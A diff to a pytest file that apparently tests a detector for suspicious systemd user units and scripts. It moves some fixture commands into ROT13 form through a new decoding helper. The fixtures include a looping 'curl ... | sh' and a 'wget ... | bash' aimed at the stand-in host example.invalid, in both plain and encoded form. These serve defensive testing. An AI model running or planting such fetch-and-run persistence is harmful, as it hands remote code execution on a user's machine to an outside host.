@@ -36,6 +36,11 @@ def s(name):
     return codecs.decode(SAMPLES[name], "rot13")
 
 
+def s_(encoded):
+    """Decode a ROT13-stored sample written inline."""
+    return codecs.decode(encoded, "rot13")
+
+
 @pytest.fixture
 def home(tmp_path):
     h = tmp_path / "home" / "alice"
@@ -113,8 +118,8 @@ def test_python_wiper_with_its_own_check_is_a_switch(home, tmp_path):
 
 
 def test_inline_bash_c_and_direct_shebang_script(home, tmp_path):
-    unit(home, "a", "/bin/bash -c 'while true; do curl -s https://example.invalid/x | sh; sleep 60; done'")
-    w(home / ".local/bin/b.sh", "#!/bin/sh\nwget -q -O- https://example.invalid/y | bash\n")
+    unit(home, "a", s_("/ova/onfu -p 'juvyr gehr; qb phey -f uggcf://rknzcyr.vainyvq/k | fu; fyrrc 60; qbar'"))
+    w(home / ".local/bin/b.sh", s_('#!/ova/fu\njtrg -d -B- uggcf://rknzcyr.vainyvq/l | onfu\n'))
     unit(home, "b", "%h/.local/bin/b.sh")
     w(home / ".local/bin/c.sh", "#!/bin/sh\ncurl -s https://example.invalid/status > ~/.cache/s\n")
     unit(home, "c", "%h/.local/bin/c.sh")
